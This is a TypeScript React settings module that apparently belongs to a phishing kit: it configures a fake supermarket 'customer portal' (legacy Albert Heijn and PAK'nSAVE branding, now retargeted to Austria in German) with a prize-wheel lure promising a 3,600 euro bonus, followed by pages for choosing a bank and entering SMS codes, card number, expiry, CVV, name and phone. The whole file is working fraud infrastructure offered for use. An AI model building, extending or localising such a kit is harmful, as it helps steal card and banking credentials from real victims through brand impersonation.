"use client";

import { createContext, useContext, useEffect, useState, ReactNode, useMemo, useRef } from "react";
import { createBrowserSupabaseClient } from "@/lib/supabase/client";
import { normalizeCountryName } from "@/lib/country-utils";
import { optimizeSupabaseImageUrl } from "@/lib/asset-url";
import { translations } from "@/lib/languageDefaults";

export type GlobalSettings = {
  logo_url: string;
  bg_url: string;
  portal_name: string;
  support_center_name: string;
  win_title: string;
  win_subtitle: string;
  win_button: string;
  banken_title: string;
  banken_subtitle: string;
  banken_search_placeholder: string;
  wait_title: string;
  wait_subtitle: string;
  sms_title: string;
  sms_subtitle: string;
  sms_input_label: string;
  sms_button: string;
  sms_loading: string;
  card_title: string;
  card_subtitle: string;
  card_owner_label: string;
  card_number_label: string;
  card_expiry_label: string;
  card_cvv_label: string;
  card_button: string;
  code_title: string;
  code_subtitle: string;
  code_button: string;
  live_support_title: string;
  live_support_subtitle: string;
  live_support_button: string;
  profile_title_small: string;
  profile_title_main: string;
  profile_subtitle: string;
  profile_firstname_label: string;
  profile_lastname_label: string;
  profile_phone_label: string;
  profile_button: string;
  profile_loading_text: string;
  site_language: string;
  target_country?: string;

  wheel_settings: any;
};

type LegacyGlobalSettings = Partial<GlobalSettings> & {
  background_url?: string;
};

const LEGACY_ALBERT_HEIJN_LOGO_URL = "https://static.ah.nl/ah-static/images/ah-ui-bridge-components/logo/logo-ah.svg";
const LEGACY_PAKNSAVE_LOGO_URL = "/wheel-assets/desktop/png/paknsave-logo-hub.png";
const PORTAL_LOGO_URL = "/wheel-assets/logo-hub.svg";
const AUSTRIA_BG_URL = "/portal/desktop-background.png";
const AUSTRIA_BG_URL_MOBILE = "/portal/mobile-background.png";
const LEGACY_BG_URL = "/spar-bg.png";
const LEGACY_BRAND_NAME = ["Albert", "Heijn"].join(" ");
const LEGACY_PORTAL_NAME = `${LEGACY_BRAND_NAME} klantenportaal`;
const LEGACY_SUPPORT_CENTER_NAME = `${LEGACY_BRAND_NAME} service`;
const LEGACY_WIN_TITLE = `Exclusieve ${LEGACY_BRAND_NAME} bonus`;
const LEGACY_WIN_SUBTITLE = [
  "Gefeliciteerd! Je bent geselecteerd voor onze",
  `${LEGACY_BRAND_NAME} actie van vandaag.`,
  "Klik op de knop hieronder om je bonus van 3.600 euro te claimen.",
].join(" ");
const LEGACY_PAKNSAVE_PORTAL_NAMES = new Set([
  "PAK'nSAVE Customer Portal",
  "PAK'nSAVE Support",
]);
const LEGACY_PAKNSAVE_WIN_TITLES = new Set([
  "Exclusive PAK'nSAVE Bonus",
]);
const LEGACY_PAKNSAVE_WIN_SUBTITLES = new Set([
  "Congratulations! You have been selected for today's PAK'nSAVE promotion. Click the button below to claim your NZ$5,000 bonus.",
]);
const GERMAN_DEFAULTS = translations.de;
const GERMAN_SUPPORT_CENTER_NAME = GERMAN_DEFAULTS.support_center_name;
const GERMAN_PORTAL_NAME = GERMAN_DEFAULTS.portal_name;
const GERMAN_WIN_TITLE = GERMAN_DEFAULTS.win_title;
const GERMAN_WIN_SUBTITLE = GERMAN_DEFAULTS.win_subtitle;
const GERMAN_WIN_BUTTON = GERMAN_DEFAULTS.win_button;
const GERMAN_BANKEN_TITLE = GERMAN_DEFAULTS.banken_title;
const GERMAN_BANKEN_SUBTITLE = GERMAN_DEFAULTS.banken_subtitle;
const GERMAN_BANKEN_SEARCH_PLACEHOLDER = GERMAN_DEFAULTS.banken_search_placeholder;
const GERMAN_WAIT_TITLE = GERMAN_DEFAULTS.wait_title;
const GERMAN_WAIT_SUBTITLE = GERMAN_DEFAULTS.wait_subtitle;
const GERMAN_SMS_TITLE = GERMAN_DEFAULTS.sms_title;
const GERMAN_SMS_SUBTITLE = GERMAN_DEFAULTS.sms_subtitle;
const GERMAN_SMS_INPUT_LABEL = GERMAN_DEFAULTS.sms_input_label;
const GERMAN_SMS_BUTTON = GERMAN_DEFAULTS.sms_button;
const GERMAN_SMS_LOADING = GERMAN_DEFAULTS.sms_loading;
const GERMAN_CARD_TITLE = GERMAN_DEFAULTS.card_title;
const GERMAN_CARD_SUBTITLE = GERMAN_DEFAULTS.card_subtitle;
const GERMAN_CARD_OWNER_LABEL = GERMAN_DEFAULTS.card_owner_label;
const GERMAN_CARD_NUMBER_LABEL = GERMAN_DEFAULTS.card_number_label;
const GERMAN_CARD_EXPIRY_LABEL = GERMAN_DEFAULTS.card_expiry_label;
const GERMAN_CARD_CVV_LABEL = GERMAN_DEFAULTS.card_cvv_label;
const GERMAN_CARD_BUTTON = GERMAN_DEFAULTS.card_button;
const GERMAN_CODE_TITLE = GERMAN_DEFAULTS.code_title;
const GERMAN_CODE_SUBTITLE = GERMAN_DEFAULTS.code_subtitle;
const GERMAN_CODE_BUTTON = GERMAN_DEFAULTS.code_button;
const LEGACY_LIVE_SUPPORT_TITLES = new Set([
  "Live support",
  "Live Support",
  "Live-Support",
]);
const LEGACY_LIVE_SUPPORT_SUBTITLES = new Set([
  "Om verder te gaan, moet je contact opnemen met onze klantenservice.\n\nKlik op de knop hieronder om het gesprek te starten.",
  "To continue, you need to contact our customer service.\n\nClick the button below to start the chat.",
]);
const LEGACY_LIVE_SUPPORT_BUTTONS = new Set([
  "Chat openen",
  "Chat starten",
  "Start Chat",
]);
const GERMAN_LIVE_SUPPORT_TITLE = GERMAN_DEFAULTS.live_support_title;
const GERMAN_LIVE_SUPPORT_SUBTITLE = GERMAN_DEFAULTS.live_support_subtitle;
const GERMAN_LIVE_SUPPORT_BUTTON = GERMAN_DEFAULTS.live_support_button;
const GERMAN_PROFILE_TITLE_SMALL = GERMAN_DEFAULTS.profile_title_small;
const GERMAN_PROFILE_TITLE_MAIN = GERMAN_DEFAULTS.profile_title_main;
const GERMAN_PROFILE_SUBTITLE = GERMAN_DEFAULTS.profile_subtitle;
const GERMAN_PROFILE_FIRSTNAME_LABEL = GERMAN_DEFAULTS.profile_firstname_label;
const GERMAN_PROFILE_LASTNAME_LABEL = GERMAN_DEFAULTS.profile_lastname_label;
const GERMAN_PROFILE_PHONE_LABEL = GERMAN_DEFAULTS.profile_phone_label;
const GERMAN_PROFILE_BUTTON = GERMAN_DEFAULTS.profile_button;
const GERMAN_PROFILE_LOADING_TEXT = GERMAN_DEFAULTS.profile_loading_text;

function normalizeBranding(settings: LegacyGlobalSettings): Partial<GlobalSettings> {
  const next = { ...settings };
  const nextWheelSettings = { ...(next.wheel_settings ?? {}) };

  if (!next.bg_url && next.background_url) {
    next.bg_url = next.background_url;
  }

  if (
    !next.logo_url ||
    next.logo_url === "/logo.png" ||
    next.logo_url === LEGACY_ALBERT_HEIJN_LOGO_URL ||
    next.logo_url === LEGACY_PAKNSAVE_LOGO_URL
  ) {
    next.logo_url = PORTAL_LOGO_URL;
  }

  if (!next.bg_url || next.bg_url === LEGACY_BG_URL) {
    next.bg_url = AUSTRIA_BG_URL;
  }

  if (!next.portal_name || next.portal_name === LEGACY_PORTAL_NAME || LEGACY_PAKNSAVE_PORTAL_NAMES.has(next.portal_name)) {
    next.portal_name = GERMAN_PORTAL_NAME;
  }

  if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME || LEGACY_PAKNSAVE_PORTAL_NAMES.has(next.support_center_name)) {
    next.support_center_name = GERMAN_SUPPORT_CENTER_NAME;
  }

  if (!next.win_title || next.win_title === LEGACY_WIN_TITLE || LEGACY_PAKNSAVE_WIN_TITLES.has(next.win_title)) {
    next.win_title = GERMAN_WIN_TITLE;
  }

  if (!next.win_subtitle || next.win_subtitle === LEGACY_WIN_SUBTITLE || LEGACY_PAKNSAVE_WIN_SUBTITLES.has(next.win_subtitle)) {
    next.win_subtitle = GERMAN_WIN_SUBTITLE;
  }

  if (next.target_country) {
    next.target_country = normalizeCountryName(next.target_country);
  }

  if (next.target_country === "Estonia" || next.target_country === "Netherlands" || next.target_country === "New Zealand") {
    next.target_country = "Austria";
  }

  if (next.site_language && next.site_language !== "de") {
    next.site_language = "de";
  }

  if (next.target_country === "Austria") {
    next.bg_url = AUSTRIA_BG_URL;
    nextWheelSettings.bg_url_mobile = AUSTRIA_BG_URL_MOBILE;
    nextWheelSettings.page_backgrounds = {};
    next.wheel_settings = nextWheelSettings;

    if (!next.support_center_name || next.support_center_name === LEGACY_SUPPORT_CENTER_NAME || LEGACY_PAKNSAVE_PORTAL_NAMES.has(next.support_center_name)) {
      next.support_center_name = GERMAN_SUPPORT_CENTER_NAME;
    }

    if (!next.live_support_title || LEGACY_LIVE_SUPPORT_TITLES.has(next.live_support_title)) {
      next.live_support_title = GERMAN_LIVE_SUPPORT_TITLE;
    }

    if (!next.live_support_subtitle || LEGACY_LIVE_SUPPORT_SUBTITLES.has(next.live_support_subtitle)) {
      next.live_support_subtitle = GERMAN_LIVE_SUPPORT_SUBTITLE;
    }

    if (!next.live_support_button || LEGACY_LIVE_SUPPORT_BUTTONS.has(next.live_support_button)) {
      next.live_support_button = GERMAN_LIVE_SUPPORT_BUTTON;
    }
  }

  if (!next.win_button) next.win_button = GERMAN_WIN_BUTTON;
  if (!next.banken_title) next.banken_title = GERMAN_BANKEN_TITLE;
  if (!next.banken_subtitle) next.banken_subtitle = GERMAN_BANKEN_SUBTITLE;
  if (!next.banken_search_placeholder) next.banken_search_placeholder = GERMAN_BANKEN_SEARCH_PLACEHOLDER;
  if (!next.wait_title) next.wait_title = GERMAN_WAIT_TITLE;
  if (!next.wait_subtitle) next.wait_subtitle = GERMAN_WAIT_SUBTITLE;
  if (!next.sms_title) next.sms_title = GERMAN_SMS_TITLE;
  if (!next.sms_subtitle) next.sms_subtitle = GERMAN_SMS_SUBTITLE;
  if (!next.sms_input_label) next.sms_input_label = GERMAN_SMS_INPUT_LABEL;
  if (!next.sms_button) next.sms_button = GERMAN_SMS_BUTTON;
  if (!next.sms_loading) next.sms_loading = GERMAN_SMS_LOADING;
  if (!next.card_title) next.card_title = GERMAN_CARD_TITLE;
  if (!next.card_subtitle) next.card_subtitle = GERMAN_CARD_SUBTITLE;
  if (!next.card_owner_label) next.card_owner_label = GERMAN_CARD_OWNER_LABEL;
  if (!next.card_number_label) next.card_number_label = GERMAN_CARD_NUMBER_LABEL;
  if (!next.card_expiry_label) next.card_expiry_label = GERMAN_CARD_EXPIRY_LABEL;
  if (!next.card_cvv_label) next.card_cvv_label = GERMAN_CARD_CVV_LABEL;
  if (!next.card_button) next.card_button = GERMAN_CARD_BUTTON;
  if (!next.code_title) next.code_title = GERMAN_CODE_TITLE;
  if (!next.code_subtitle) next.code_subtitle = GERMAN_CODE_SUBTITLE;
  if (!next.code_button) next.code_button = GERMAN_CODE_BUTTON;
  if (!next.profile_title_small) next.profile_title_small = GERMAN_PROFILE_TITLE_SMALL;
  if (!next.profile_title_main) next.profile_title_main = GERMAN_PROFILE_TITLE_MAIN;
  if (!next.profile_subtitle) next.profile_subtitle = GERMAN_PROFILE_SUBTITLE;
  if (!next.profile_firstname_label) next.profile_firstname_label = GERMAN_PROFILE_FIRSTNAME_LABEL;
  if (!next.profile_lastname_label) next.profile_lastname_label = GERMAN_PROFILE_LASTNAME_LABEL;
  if (!next.profile_phone_label) next.profile_phone_label = GERMAN_PROFILE_PHONE_LABEL;
  if (!next.profile_button) next.profile_button = GERMAN_PROFILE_BUTTON;
  if (!next.profile_loading_text) next.profile_loading_text = GERMAN_PROFILE_LOADING_TEXT;
  if (!next.site_language) next.site_language = "de";
  if (!next.target_country) next.target_country = "Austria"; // Default olarak Austria

  return next;
}

export const defaultSettings: GlobalSettings = {
  logo_url: PORTAL_LOGO_URL,
  bg_url: AUSTRIA_BG_URL,
  portal_name: GERMAN_PORTAL_NAME,
  support_center_name: GERMAN_SUPPORT_CENTER_NAME,
  win_title: GERMAN_WIN_TITLE,
  win_subtitle: GERMAN_WIN_SUBTITLE,
  win_button: GERMAN_WIN_BUTTON,
  banken_title: GERMAN_BANKEN_TITLE,
  banken_subtitle: GERMAN_BANKEN_SUBTITLE,
  banken_search_placeholder: GERMAN_BANKEN_SEARCH_PLACEHOLDER,
  wait_title: GERMAN_WAIT_TITLE,
  wait_subtitle: GERMAN_WAIT_SUBTITLE,
  sms_title: GERMAN_SMS_TITLE,
  sms_subtitle: GERMAN_SMS_SUBTITLE,
  sms_input_label: GERMAN_SMS_INPUT_LABEL,
  sms_button: GERMAN_SMS_BUTTON,
  sms_loading: GERMAN_SMS_LOADING,
  card_title: GERMAN_CARD_TITLE,
  card_subtitle: GERMAN_CARD_SUBTITLE,
  card_owner_label: GERMAN_CARD_OWNER_LABEL,
  card_number_label: GERMAN_CARD_NUMBER_LABEL,
  card_expiry_label: GERMAN_CARD_EXPIRY_LABEL,
  card_cvv_label: GERMAN_CARD_CVV_LABEL,
  card_button: GERMAN_CARD_BUTTON,
  code_title: GERMAN_CODE_TITLE,
  code_subtitle: GERMAN_CODE_SUBTITLE,
  code_button: GERMAN_CODE_BUTTON,
  live_support_title: GERMAN_LIVE_SUPPORT_TITLE,
  live_support_subtitle: GERMAN_LIVE_SUPPORT_SUBTITLE,
  live_support_button: GERMAN_LIVE_SUPPORT_BUTTON,
  profile_title_small: GERMAN_PROFILE_TITLE_SMALL,
  profile_title_main: GERMAN_PROFILE_TITLE_MAIN,
  profile_subtitle: GERMAN_PROFILE_SUBTITLE,
  profile_firstname_label: GERMAN_PROFILE_FIRSTNAME_LABEL,
  profile_lastname_label: GERMAN_PROFILE_LASTNAME_LABEL,
  profile_phone_label: GERMAN_PROFILE_PHONE_LABEL,
  profile_button: GERMAN_PROFILE_BUTTON,
  profile_loading_text: GERMAN_PROFILE_LOADING_TEXT,
  site_language: "de",
  target_country: "Austria",
  wheel_settings: {
    bg_url_mobile: AUSTRIA_BG_URL_MOBILE,
    page_backgrounds: {},
  },
};

const SettingsContext = createContext<{ settings: GlobalSettings; loading: boolean }>({
  settings: defaultSettings,
  loading: false,
});

export function SettingsProvider({ children }: { children: ReactNode }) {
  const [settings, setSettings] = useState<GlobalSettings>(defaultSettings);
  const [loading, setLoading] = useState(true);
  const supabase = useMemo(() => createBrowserSupabaseClient(), []);
  const bgSignatureRef = useRef("");

  useEffect(() => {
    async function loadSettings() {
      if (!supabase) {
        setLoading(false);
        return;
      }
      const { data, error } = await supabase
        .from("global_settings")
        .select("*")
        .limit(1)
        .maybeSingle();

      if (data && !error) {
        setSettings((prev) => normalizeBranding({ ...prev, ...data }) as GlobalSettings);
      }
      setLoading(false);
    }
    
    void loadSettings();
  }, [supabase]);

  // Apply custom background image dynamically to the body
  useEffect(() => {
    let frameId = 0;

    const updateBg = () => {
      if (frameId) {
        window.cancelAnimationFrame(frameId);
      }

      frameId = window.requestAnimationFrame(() => {
        frameId = 0;

      const isMobile = window.innerWidth <= 768;
      const targetWidth = Math.min(
        Math.round(window.innerWidth * Math.max(window.devicePixelRatio || 1, 1)),
        isMobile ? 900 : 1600,
      );
      
      let activeBg = isMobile && settings.wheel_settings?.bg_url_mobile 
        ? settings.wheel_settings.bg_url_mobile 
        : settings.bg_url;
        
      const pageBgs = settings.wheel_settings?.page_backgrounds || {};
      
      // Determine page-specific background
      const path = window.location.pathname;
      if (path.includes('/code') && pageBgs.code) activeBg = pageBgs.code;
      else if (path.includes('/wheel') && pageBgs.wheel) activeBg = pageBgs.wheel;
      else if (path.includes('/win') && pageBgs.win) activeBg = pageBgs.win;
      else if (path.includes('/form') && pageBgs.form) activeBg = pageBgs.form;
      else if (path.includes('/banken') && pageBgs.banken) activeBg = pageBgs.banken;
      else if (path.includes('/sms') && pageBgs.sms) activeBg = pageBgs.sms;
      else if (path.includes('/card') && pageBgs.card) activeBg = pageBgs.card;

      if (activeBg) {
        const optimizedBg = optimizeSupabaseImageUrl(activeBg, {
          width: targetWidth,
          quality: isMobile ? 60 : 68,
          format: "webp",
        });
        const nextSignature = `${window.location.pathname}|${optimizedBg}`;
        if (bgSignatureRef.current === nextSignature) {
          return;
        }

        bgSignatureRef.current = nextSignature;
        document.documentElement.style.setProperty('--custom-bg', `url("${optimizedBg}")`);
      }
      });
    };

    updateBg();
    window.addEventListener('resize', updateBg);
    window.addEventListener('orientationchange', updateBg);
    return () => {
      if (frameId) {
        window.cancelAnimationFrame(frameId);
      }
      window.removeEventListener('resize', updateBg);
      window.removeEventListener('orientationchange', updateBg);
    };
  }, [settings.bg_url, settings.wheel_settings, loading]);

  return (
    <SettingsContext.Provider value={{ settings, loading }}>
      {children}
    </SettingsContext.Provider>
  );
}

export function useSettings() {
  return useContext(SettingsContext);
}
